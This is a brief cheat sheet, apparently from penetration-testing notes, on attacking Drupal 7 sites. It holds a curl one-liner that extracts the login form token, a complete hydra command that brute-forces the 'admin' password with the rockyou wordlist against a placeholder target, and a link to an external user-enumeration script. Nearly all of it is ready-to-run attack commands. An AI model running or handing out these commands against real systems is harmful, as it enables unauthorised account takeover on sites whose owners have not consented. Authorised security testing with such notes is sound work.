## Drupal 7

### Brute-forcing 
```
curl -s http://drupal.site/user/ | grep form_build_id | cut -d "\"" -f 6
```
```
hydra -l admin -P /wordlists/rockyou.txt (TARGET DRUPAL IP) http-form-post "/?q=user/:name=admin&pass=^PASS^&form_id=user_login&form_build_id=form-uQ6n4rbHr99R2XZirfsxaa3rPmV8xpZjXWsa3-G-8Nw:Sorry
```

### Userenum

- <https://raw.githubusercontent.com/weaknetlabs/Penetration-Testing-Grimoire/master/Brute%20Force/Tools/drupalUserEnum.py>